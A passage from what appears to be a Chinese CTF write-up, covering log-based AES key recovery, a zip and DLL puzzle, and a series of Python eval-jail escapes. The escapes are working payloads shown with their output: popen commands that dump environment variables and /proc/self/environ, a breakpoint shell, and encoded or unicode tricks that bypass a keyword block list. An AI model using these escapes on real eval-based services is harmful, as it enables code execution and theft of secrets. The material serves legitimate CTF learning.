从标准输入读取过滤后的日志</span></span><br><span class="line">    logs = sys.stdin.read().splitlines()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> logs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有找到攻击日志&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    aes_key = extract_aes_key_from_blind_injection(logs)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> aes_key:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取的AES密钥: <span class="subst">&#123;aes_key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥长度: <span class="subst">&#123;<span class="built_in">len</span>(aes_key)&#125;</span> 字符&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;十六进制: <span class="subst">&#123;aes_key.encode().<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未能提取AES密钥&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>类似方法提取password和iv。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">aes_key_hex = <span class="string">&#x27;b1c91fe0fc5af04615230c9196b087ff&#x27;</span></span><br><span class="line">aes_iv = <span class="string">&#x27;61945a9ac62102c6&#x27;</span>  <span class="comment"># 8字节</span></span><br><span class="line">password_hash = <span class="string">&#x27;5a15c26228ae3af44797eaa4426d8fd498f79ecb2059b592903422eaafc355ab4c105a9e7ab6b5a43195266887779269&#x27;</span></span><br><span class="line"></span><br><span class="line">aes_key = <span class="built_in">bytes</span>.fromhex(aes_key_hex)</span><br><span class="line">encrypted_data = <span class="built_in">bytes</span>.fromhex(password_hash)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最终解密尝试...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;aes_key_hex&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;IV: <span class="subst">&#123;aes_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CTR 模式（支持 8 字节 nonce）</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CTR, nonce=<span class="built_in">bytes</span>.fromhex(aes_iv))</span><br><span class="line">    decrypted = cipher.decrypt(encrypted_data)</span><br><span class="line">    result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CTR 结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;🎯 找到 flag!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CTR 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 CTR 不行，尝试用补全的 IV 进行 CBC</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 补全 IV 到 16 字节</span></span><br><span class="line">    full_iv = <span class="built_in">bytes</span>.fromhex(aes_iv + <span class="string">&#x27;0000000000000000&#x27;</span>)  <span class="comment"># 补0</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC, full_iv)</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line">    decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)</span><br><span class="line">    result = decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CBC(补0) 结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> result.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;🎯 找到 flag!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CBC(补0) 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>C!C!B!</li>
</ul>
<blockquote>
<p>从滚木的手机里发现的文件，里面有什么呢？</p>
</blockquote>
<p>尝试之后发现是伪加密，注意7z看到里面有两个文件，所以一共是2*2=4个标记需要更改。</p>
<p>解密之后，电棍笑传之.txt：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后我猜你可能需要这个：aHR0cHM6Ly9saGxuYi50b3AvaGFqaW1pL2Jhc2U2NA==</span><br></pre></td></tr></table></figure>
<p>base64解码得到网址：<strong><a target="_blank" rel="noopener" href="https://lhlnb.top/hajimi/base64">https://lhlnb.top/hajimi/base64</a></strong></p>
<p>打开发现是哈基米语解密，解密结果错误</p>
<p>仔细寻找发现网站下方可以设置密钥，一开始眼神不好没看见，试了半天</p>
<p>密钥必然是在C!C!B!.dll里面，拷打AI得到脚本，原理还不清楚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">dll = ctypes.WinDLL(<span class="string">&#x27;./C!C!B!.dll&#x27;</span>)</span><br><span class="line">dll.CCB()</span><br></pre></td></tr></table></figure>
<p>powershell运行可得密码：b31915cd51e064bbaf8d6b2790ba108df10c84358f37033cb83609e78e9a3bfb</p>
<p>得到flag<strong>CBCTF{y0U_4re_tRULY_a_CCB_mA$TEr}</strong></p>
<ul>
<li>py_jail1</li>
</ul>
<blockquote>
<p>时隔一年，JBNRZ 又搬出了他的陈年老题，相信你一定可以秒了它</p>
<p>这一关，你会 <code>python</code> 吗</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env | grep -i flag; cat /proc/self/environ | tr &quot;\\0&quot; &quot;\\n&quot; | grep -i flag&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>FLAG=<strong>CBCTF{YOU_cAn-EX3cUTE_THe_SYYyYYStEM_cOMmAnD}</strong></p>
<ul>
<li>py_jail2</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       ____  </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     |___ \ </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |       __) |</span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___   / __/ </span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____| |_____|</span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env | grep -i flag; cat /proc/self/environ | tr &quot;\\0&quot; &quot;\\n&quot; | grep -i flag&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line">Result: FLAG=CBCTF&#123;wEL1_evAL_fUNCCtiON-iS_NOT-SAF3&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>py_jail4</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       _____ </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     |___ / </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |       |_ \ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___   ___) |</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____| |____/ </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nohh, this time with a length limit, it&#x27;s more secure!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data) &gt; <span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s too long to eval&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">Result: CBCTF&#123;oOo_FxXK_THIs-1SsS-NOt-SeCURe&#125;</span><br></pre></td></tr></table></figure>
<p>py_jail 4</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       _  _   </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     | || |  </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |     | || |_ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___  |__   _|</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____|    |_|  </span></span><br><span class="line"><span class="string">                                          </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nI believe shorter is more secure!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data) &gt; <span class="number">12</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s too long to eval&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) !<span class="keyword">import</span> os; <span class="built_in">print</span>(os.getenv(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">CBCTF&#123;OK-You_aRe_bRe@kPoInT_maStEr&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>py_jail5</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       ____  </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     | ___| </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |     |___ \ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___   ___) |</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____| |____/ </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">black = [<span class="string">&quot;input&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;breakpoint&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nI banned some dangerous words!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([i <span class="keyword">in</span> input_data <span class="keyword">for</span> i <span class="keyword">in</span> black]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ohhhh, what are you doing???!!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">str</span>().join(<span class="built_in">map</span>(<span class="built_in">chr</span>,[<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">59</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">118</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">70</span>,<span class="number">76</span>,<span class="number">65</span>,<span class="number">71</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">41</span>])))</span><br><span class="line">CBCTF&#123;nOoOOoo-You-bREak_MmY_jAil&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>py_jail6</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _        __   </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |      / /_  </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |     | &#x27;_ \ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___  | (_) |</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____|  \___/ </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nYou can not use any letters!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([i <span class="keyword">in</span> ascii_letters <span class="keyword">for</span> i <span class="keyword">in</span> input_data]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ohhhh, what are you doing???!!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; __𝑖𝑚𝑝𝑜𝑟𝑡__(<span class="string">&#x27;\157\163&#x27;</span>).𝑝𝑜𝑝𝑒𝑛(<span class="string">&#x27;\145\156\166&#x27;</span>).𝑟𝑒𝑎𝑑()</span><br><span class="line">Result: KUBERNETES_SERVICE_PORT=443</span><br><span class="line">KUBERNETES_PORT=tcp://10.43.0.1:443</span><br><span class="line">REMOTE_HOST=100.64.0.4</span><br><span class="line">HOSTNAME=pod-0af3eb6e4f0e875378b7</span><br><span class="line">HOME=/root</span><br><span class="line">LC_CTYPE=C.UTF-8</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.43.0.1</span><br><span class="line">PWD=/</span><br><span class="line">FLAG=CBCTF&#123;l-ForgEt_ThE_UNlcODE_l3TT3EEERS&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4011C0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-114h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+18h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-10Ch]</span></span><br><span class="line">  LPVOID lpMem; <span class="comment">// [esp+20h] [ebp-108h]</span></span><br><span class="line">  _BYTE v10[<span class="number">256</span>]; <span class="comment">// [esp+24h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401440(aEnterInput);</span><br><span class="line">  v0 = sub_4059A8(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_405B85(v10, <span class="number">256</span>, v0) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = sub_4079B0(v10, asc_41E01C);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="number">0x100</span> )</span><br><span class="line">      sub_40159D();</span><br><span class="line">    v10[v6] = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v3 = sub_407A00(v10);</span><br><span class="line">    lpMem = (LPVOID)sub_401000((<span class="type">int</span>)v10, v3, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    